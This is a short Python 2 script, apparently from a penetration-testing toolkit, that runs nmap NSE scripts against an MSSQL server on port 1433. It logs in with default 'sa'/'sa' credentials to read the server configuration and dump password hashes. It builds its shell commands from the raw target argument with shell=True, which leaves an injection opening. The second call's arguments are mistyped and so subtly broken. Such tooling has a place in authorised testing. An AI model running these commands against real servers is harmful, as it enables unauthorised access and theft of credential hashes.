#!/usr/bin/python

import sys, os, subprocess, re, time

if len(sys.argv) != 2:
    print "Usage: mssql.py <target>"
    sys.exit(0)

ip_address = str(sys.argv[1])
NSEscripts = ["ms-sql-config.nse", "ms-sql-dump-hashes.nse"]

def nmap(ip_address):
	print "[*] Running non-default NSE MSSQL scripts against " + ip_address	
	for script in NSEscripts:
		if ("ms-sql-config" in script):
			smbnse = "nmap -sS -p1433 --script ms-sql-config.nse --script-args mssql.username=sa,mssql.password=sa %s -oA /tmp/%s/ms-sql-config" % (ip_address, ip_address)
			subprocess.call(smbnse, shell=True)
		elif ("ms-sql-dump-hashes" in script):
			smbnse = "nmap -sS -p1433 --script ms-sql-dump-hashes.nse --script-args=mssql.instance-port=1433,smsql.username-sa,mssql.password-sa %s -oA /tmp/%s/ms-sql-dump-hashes" % (ip_address, ip_address)
			subprocess.call(smbnse, shell=True)

def main():
	nmap(ip_address)

if __name__=='__main__':
	main()
